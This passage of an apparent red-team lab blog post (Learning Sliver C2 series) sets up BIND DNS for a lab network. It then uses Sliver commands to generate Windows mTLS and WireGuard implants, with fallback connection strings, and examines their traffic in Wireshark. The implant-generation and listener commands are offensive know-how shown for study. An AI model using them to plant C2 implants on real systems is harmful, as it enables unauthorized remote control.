+</span></span><span style="display:flex;"><span>zone &#34;122.168.192.in-addr.arpa&#34; {
+</span></span><span style="display:flex;"><span>    type master;
+</span></span><span style="display:flex;"><span>    file &#34;/etc/bind/zones/db.122.168.192&#34;;    # 192.168.122.0/24
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>On to the forward zone specification, which goes into <code>/etc/bind/zones/db.labnet.local</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$TTL    604800
+</span></span><span style="display:flex;"><span>@       IN      SOA     ns.labnet.local. admin.labnet.local. (
+</span></span><span style="display:flex;"><span>                              4         ; Serial
+</span></span><span style="display:flex;"><span>                         604800         ; Refresh
+</span></span><span style="display:flex;"><span>                          86400         ; Retry
+</span></span><span style="display:flex;"><span>                        2419200         ; Expire
+</span></span><span style="display:flex;"><span>                         604800 )       ; Negative Cache TTL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; name servers - NS records
+</span></span><span style="display:flex;"><span>    IN      NS      ns.labnet.local.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; name servers - A records
+</span></span><span style="display:flex;"><span>ns.labnet.local.          IN      A       192.168.122.185
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; 192.168.122.0/24 - A records
+</span></span><span style="display:flex;"><span>target.labnet.local.        IN      A      192.168.122.160
+</span></span><span style="display:flex;"><span>sliver.labnet.local.        IN      A      192.168.122.111
+</span></span></code></pre></div><p>We basically define SOA and NS records for <code>ns.labnet.local</code> as well
+as a few A records for all the hosts. Note that the entry <code>admin.labnet.local.</code>
+is a just a strange way of writing that <code>admin@labnet.local</code> is the admin email address
+of the zone.</p>
+<p>Just to have a really professional DNS setup, I also added support
+for reverse lookups. This is my content of <code>/etc/bind/zones/db.122.168.192 </code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$TTL    604800
+</span></span><span style="display:flex;"><span>@       IN      SOA     ns.labnet.local. admin.labnet.local. (
+</span></span><span style="display:flex;"><span>                              4         ; Serial
+</span></span><span style="display:flex;"><span>                         604800         ; Refresh
+</span></span><span style="display:flex;"><span>                          86400         ; Retry
+</span></span><span style="display:flex;"><span>                        2419200         ; Expire
+</span></span><span style="display:flex;"><span>                         604800 )       ; Negative Cache TTL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; name servers
+</span></span><span style="display:flex;"><span>      IN      NS      ns.labnet.local.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; PTR Records
+</span></span><span style="display:flex;"><span>105   IN      PTR     ns.labnet.local.        ; 192.168.122.185
+</span></span><span style="display:flex;"><span>160   IN      PTR     target.labnet.local.    ; 192.168.122.160
+</span></span><span style="display:flex;"><span>111   IN      PTR     sliver.labnet.local.    ; 192.168.122.111
+</span></span></code></pre></div><p>Now check all config files for errors with the following commands:</p>
+<ul>
+<li>run <code>named-checkconf</code> to check the options: no output means no errors</li>
+<li>run <code>named-checkzone labnet.local /etc/bind/zones/db.labnet.local</code> and look for <code>OK</code></li>
+<li>run <code>named-checkzone 192.168.122.in-addr.arpa /etc/bind/zones/db.122.168.192</code> and look for <code>OK</code></li>
+</ul>
+<p>If everything works fine, restart bind with <code>systemctl restart bind9</code>.
+After that, go to your Sliver C2 server and verify that DNS resolution works.
+If it does it should look like this:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ dig +short @192.168.122.185 target.labnet.local
+192.168.122.160
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ dig +short @192.168.122.185 -x 192.168.122.160     
+target.labnet.local.
+</code></pre><p>On the DNS server, you should be able to see these two queries in the log file:</p>
+<pre tabindex="0"><code>root@proxy:~# cat /var/log/bind/query 
+08-Jul-2022 23:31:37.985 client @0x7f89d4020920 192.168.122.111#58864 (target.labnet.local): query: target.labnet.local IN A +E(0)K (192.168.122.185)
+08-Jul-2022 23:31:38.605 client @0x7f89d4020920 192.168.122.111#53780 (160.122.168.192.in-addr.arpa): query: 160.122.168.192.in-addr.arpa IN PTR +E(0)K (192.168.122.185)
+</code></pre><p>A more detailed introduction to BIND setup is <a href="https://www.digitalocean.com/community/tutorials/how-to-configure-bind-as-a-private-network-dns-server-on-debian-9">here</a>.
+Notes about logging and AppArmor are <a href="https://nsrc.org/activities/agendas/en/dnssec-3-days/dns/materials/labs/en/dns-bind-logging.html">here</a>.</p>
+<h3 id="configure-dns-on-target">Configure DNS on target</h3>
+<p>Now we are ready to configure the target Windows machine with the new DNS server.
+Log in, right-click the network tray icon in the lower right, open then network
+preferences and change your adapter&rsquo;s network settings such that it uses our
+new DNS server. Below, you can see how I set <code>192.168.122.185</code>:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/dns_configured.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Windows Settings for DNS configuration</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>With that out of the way, the Windows target should be able to find the Sliver C2 server by DNS name.
+Ensure you have the Apache web server running and test that.
+On the Windows target, open the browser and go to <a href="http://sliver.labnet.local">sliver.labnet.local</a>.
+It should work:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/dns_works.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Windows Settings for DNS confirmed to work</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h2 id="mtls-transport-in-detail">mTLS transport in detail</h2>
+<p>On the C2 server, generate a new implant with mTLS transport.
+Specify two connection strings, one with the DNS name, the other the IP address.</p>
+<pre tabindex="0"><code>sliver &gt; generate beacon --os windows --arch amd64 --format exe --seconds 5 --save /tmp/implant-domain-ip.exe --mtls sliver.labnet.local,192.168.122.111
+
+[*] Generating new windows/amd64 beacon implant binary (5s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:19
+[*] Implant saved to /tmp/implant-domain-ip.exe
+
+sliver &gt; mtls
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #1
+
+sliver &gt; jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    mtls   tcp        8888
+</code></pre><p>Now run Wireshark on the Windows target so that we are able to monitor the network traffic our implant generates.
+Serve the implant from the Apache web server and run it on the target Windows machine.
+The beacon session should be established.</p>
+<h3 id="connection-with-working-dns-setup">Connection with working DNS setup</h3>
+<p>The following DNS traffic should be visible in Wireshark.
+It shows that the implant requested the IP of the sliver server via DNS.
+That is, it used the first of the connection strings we gave it.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/dns_request_worked.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The implant did a DNS request to get the IP of the domain name</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Shortly after, the following kind of traffic should appear.
+It shows nothing more than a TLS connection established to the sliver server.
+Note that the DNS name is again visible in plain text due to server name identification (SNI).</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/mtls_connection_established.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The implant established the TLS connection to the sliver server</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Since the implant was created as a beacon, the TLS connection is not kept open.
+Instead, you see in the traffic capture that it frequently disconnects, then reconnects later.
+Below is an example. The upper block shows how one connection ends and the lower block is
+the start of the next one:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/disconnect_then_reconnect.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The beacon implant frequently disconnects, then reconnects shortly after</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Time to kill this beacon.</p>
+<h3 id="connection-with-broken-dns-setup">Connection with broken DNS setup</h3>
+<p>Now we break the DNS setup previously created to see if the implant successfully switches to the alternative
+connection string, which contains only the IP address.
+For example, you can break DNS by shutting down BIND on <code>192.168.122.185</code>, using command <code>systemctl stop bind9</code>.
+Remember to run <code>ipconfig /flushdns</code> on the Windows target or else it will just use a cached value.</p>
+<p>With Wireshark running, try executing the implant again and see if you get the callback.
+It should work just fine and indeed, for me it did.
+However, this time it takes a bit more time.
+The reason is that a few attempts to do DNS resolution have to fail, which looks like this in Wireshark:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/dns_resolution_fails.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The implant tries to resolve the domain but does not get a response</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>After a while though, the implant used the fallback connection string and connected directly to the IP address.
+Note that there is no SNI DNS name visible in this traffic, which confirms that this connection is not
+using the DNS-based connection string.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/tls_connection_still_works.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The implant successfully connects using its fallback IP</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>In sliver, you should see the session.
+Feel free to kill it and restart the BIND service to make DNS work again.</p>
+<h2 id="wireguard-transport-in-detail">WireGuard transport in detail</h2>
+<p>On the sliver server, generate the same implant as before, but specify <code>--wg</code> as the transport.
+Note that you could use a beacon here, but at the time of writing there seemed to be a bug and WireGuard
+beacons did not work on Windows. I experienced the same issues but the session implant worked
+(<a href="https://github.com/BishopFox/sliver/issues/670">GitHub Issue</a>).
+By the time you read this, beacons might work too.</p>
+<pre tabindex="0"><code>sliver &gt; generate --os windows --arch amd64 --format exe --save /tmp/implant-wireguard.exe --wg sliver.labnet.local,192.168.122.111
+
+[*] Generated unique ip for wg peer tun interface: 100.64.0.24
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:19
+[*] Implant saved to /tmp/implant-wireguard.exe
+</code></pre><p>Also, don&rsquo;t forget to start the WireGuard listener with <code>wg</code>, which will listen on port 53:</p>
+<pre tabindex="0"><code>[*] Starting Wireguard listener ...
+[*] Successfully started job #2
+
+sliver &gt; jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    mtls   tcp        8888 
+ 2    wg     udp        53
+</code></pre><p>Download the executable to the Windows target server and run it.
+In Wireshark, you will first see the DNS request again, since our first connection string is a DNS name:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/wireguard_dns_query.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Like before, the implant uses DNS to find the sliver server</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>After that, the WireGuard connection is established. In Wireshark, this looks like a DNS connection
+full of broken packets (WireGuard uses UDP on port 53):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/wireguard_connection.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The implant uses WireGuard to connect to the server, which creates UDP traffic on port 53</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h2 id="bonus-section-debug-mode">Bonus section: debug mode</h2>
+<p>There is another great way to inspect what the implants do.
+You can compile them in debug mode.
+If you launch such an implant, you can read debug messages on the console.
+For example, this is what it looks like to launch an mTLS beacon implant:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/26_sliver_c2_transports_in_detail_mtls_wg/debug_mode.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Implant compiled with --debug shows lots of console output</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2022-09-07T00:00:00&#43;00:00">
+    7 Sep, 2022
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/red-team/">red-team</a> and <a href="/tags/sliver/">sliver</a>
+  
+  using <span itemprop="wordCount">2125</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
+        <time datetime="13M">13 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Installation</a>
+        <time datetime="8M">8 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
